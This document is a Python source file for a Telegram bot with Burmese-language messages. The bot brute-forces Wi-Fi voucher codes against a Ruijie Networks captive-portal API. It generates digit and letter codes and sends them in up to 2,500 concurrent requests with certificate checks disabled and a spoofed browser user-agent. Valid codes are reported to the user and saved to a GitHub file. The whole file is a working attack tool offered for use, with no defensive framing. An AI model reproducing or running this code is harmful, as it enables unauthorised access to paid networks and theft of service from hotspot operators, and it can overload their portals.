import os
import telebot
from flask import Flask, request
import asyncio
import aiohttp
import json
import base64
import random
import re
import string
import time
import uuid
import concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# Configuration & Tokens
TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")

RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")
PORT = int(os.environ.get("PORT", 10000))

bot = AsyncTeleBot(TOKEN)
app = Flask(__name__)

SUCCESS_CODE = asyncio.Queue()
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}

_start_time = time.monotonic()

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 5
CONCURRENCY = 2500

session = None
_connector = None
_voucher_sem = None

# Flask Webhook Endpoint
@app.route(f"/{TOKEN}", methods=["POST"])
def receive_message():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        asyncio.run(bot.process_new_updates([update]))
        return "!", 200
    else:
        return "Invalid!", 403

@app.route('/')
def index():
    return "Bot Webhook Server is running!"

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def get_file_content(path):
    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        return {}, None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception as e:
        print(f"GitHub get error: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        return
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# Inline Keyboards Menu ဖန်တီးခြင်း
def get_mode_keyboard():
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("6", callback_data="mode_6"),
        InlineKeyboardButton("7", callback_data="mode_7"),
        InlineKeyboardButton("8", callback_data="mode_8")
    )
    markup.add(
        InlineKeyboardButton("🔄 Ascii-Lower", callback_data="mode_ascii-lower"),
        InlineKeyboardButton("⚡ All Modes", callback_data="mode_all")
    )
    return markup

def get_stop_keyboard():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
    return markup

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    await bot.reply_to(message, "မင်္ဂလာပါ! Webhook စနစ်ဖြင့် Bot အလုပ်လုပ်နေပါပြီ။\n/key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def check_key(message):
    global approve
    chat_id = message.chat.id
    approve[chat_id] = True
    user_data[chat_id] = {}
    await bot.reply_to(message, "🟢 Proxy Status: ON (Key အချက်အလက်များ အသင့်ရှိပါပြီ။\n\nကျေးဇူးပြု၍ Portal URL ကို ပေးပို့ရန် `/portal <url>` ကို အသုံးပြုပါ သို့မဟုတ် URL ကို တိုက်ရိုက်ပေးပို့ပါ။")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/portal <session_url>")
        return
    url = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['session_url'] = url
    
    await bot.send_message(
        chat_id,
        "🔗 **Portal URL အားစစ်ဆေးပြီးပါပြီ။**\n\nကျေးဇူးပြု၍ **VOUCHER Mode** တစ်ခုကို ရွေးချယ်ပါ သို့မဟုတ် `/scan <mode>` ဖြင့် ရိုက်ထည့်ပါ (ဥပမာ: `/scan 7`)",
        reply_markup=get_mode_keyboard(),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['scan'])
async def scan_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1].strip()
    await start_scanning_process(message.chat.id, mode, message=message)

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id_str = str(message.chat.id)
    results, _ = await get_file_content("result.json")
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join([f"🔑 `{c}`" for c in results[chat_id_str]])
        await bot.reply_to(message, f"✅ **Found Success Codes:**\n\n{codes}", parse_mode="Markdown")
    else:
        # Local memory ထဲကဟာကိုပါ ပြန်ပြပေးရန်
        chat_id = message.chat.id
        if chat_id in success_texts and success_texts[chat_id]:
            codes = "\n".join(success_texts[chat_id])
            await bot.reply_to(message, f"✅ **Found Success Codes:**\n\n{codes}", parse_mode="Markdown")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

# Inline Keyboard Callback Handler
@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if data.startswith("mode_"):
        mode = data.replace("mode_", "")
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            await bot.answer_callback_query(call.id, "Portal URL ဦးစွာထည့်သွင်းပေးပါ။", show_alert=True)
            return
        await bot.answer_callback_query(call.id, f"Voucher Mode {mode} ကို ရွေးချယ်ပြီးပါပြီ။")
        await start_scanning_process(chat_id, mode, message=call.message, is_callback=True)

    elif data == "stop_scan":
        task_data = scan_tasks.get(chat_id)
        if task_data and not task_data["task"].done():
            task_data["stop"] = True
            task_data["task"].cancel()
            scan_tasks.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "Scan ကို ရပ်တန့်ပြီးပါပြီ။")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🛑 **Scan ကို ရပ်တန့်ပြီးပါပြီ။**",
                    parse_mode="Markdown"
                )
            except:
                pass
        else:
            await bot.answer_callback_query(call.id, "လက်တလော လုပ်ဆောင်နေသော scan မရှိပါ။", show_alert=True)

    elif data == "back_menu":
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="ကျေးဇူးပြု၍ **VOUCHER Mode** တစ်ခုကို ရွေးချယ်ပါ။",
                reply_markup=get_mode_keyboard(),
                parse_mode="Markdown"
            )
        except:
            pass

async def start_scanning_process(chat_id, mode, message=None, is_callback=False):
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        if message:
            if is_callback:
                await bot.send_message(chat_id, "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။")
            else:
                await bot.reply_to(message, "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        if message:
            msg = "⚡ Scan သည် အလုပ်လုပ်နေပြီးဖြစ်ပါသည်။"
            if is_callback:
                await bot.send_message(chat_id, msg)
            else:
                await bot.reply_to(message, msg)
        return

    init_text = f"🔍 **Scanning VOUCHER Codes...**\n\n📦 Checked : 0 / {10**int(mode) if mode in ['6','7'] else 'Unlimited'}\n📊 Progress : 0.00%\n⚡ Speed : 0 codes/min\n✅ Success code hit : 0"
    
    if is_callback and message:
        try:
            progress_msg = await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message.message_id,
                text=init_text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except:
            progress_msg = await bot.send_message(chat_id, init_text, reply_markup=get_stop_keyboard(), parse_mode="Markdown")
    else:
        progress_msg = await bot.send_message(chat_id, init_text, reply_markup=get_stop_keyboard(), parse_mode="Markdown")

    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "checked": 0,
        "total": 10 ** int(mode) if mode in ["6", "7"] else None,
        "speed": 0,
        "found": 0,
        "retries": 0,
        "start_time": time.monotonic(),
        "mode": mode,
    }

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def all_generator(length=6):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    pending = set()
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(session_url, code, chat_id, scan_id)

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 1.5:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        
        if total:
            percent = (checked / total) * 100
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,} / {total:,}\n"
                f"📊 Progress : {percent:.2f}%\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        else:
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,}\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break

            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            if len(pending) >= CONCURRENCY:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)
            await _flush_progress()

    except asyncio.CancelledError:
        pass
    finally:
        scan_tasks.pop(chat_id, None)

async def perform_check(session_url, code, chat_id, scan_id=None):
    # Ruijie API သို့ ပို့ဆောင်စစ်ဆေးသည့် အပိုင်း
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as task_session:
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
            }
            payload = {
                "accessCode": code,
                "apiVersion": 1,
            }
            async with task_session.post(post_url, json=payload, headers=headers) as req:
                response = await req.text()
                if 'logonUrl' in response or req.status == 200 and 'success' in response:
                    if chat_id not in success_texts:
                        success_texts[chat_id] = []
                    
                    success_msg = f"🎫 `{code}`\n   📋 Plan: 1M | ⏳ Time: 0m"
                    success_texts[chat_id].append(success_msg)
                    
                    # GitHub result.json သို့ အလိုအလျောက်သိမ်းရန်
                    try:
                        results, sha = await get_file_content("result.json")
                        chat_str = str(chat_id)
                        if chat_str not in results:
                            results[chat_str] = []
                        if code not in results[chat_str]:
                            results[chat_str].append(code)
                            await update_file_content("result.json", results, sha, f"Add code {code}")
                    except:
                        pass

                    await bot.send_message(chat_id, f"Success Codes:\n\n{success_msg}", parse_mode="Markdown")
                    return code
    except Exception:
        pass
    return None

if __name__ == '__main__':
    asyncio.run(rebuild_session())
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_EXTERNAL_URL}/{TOKEN}")
    app.run(host="0.0.0.0", port=PORT)
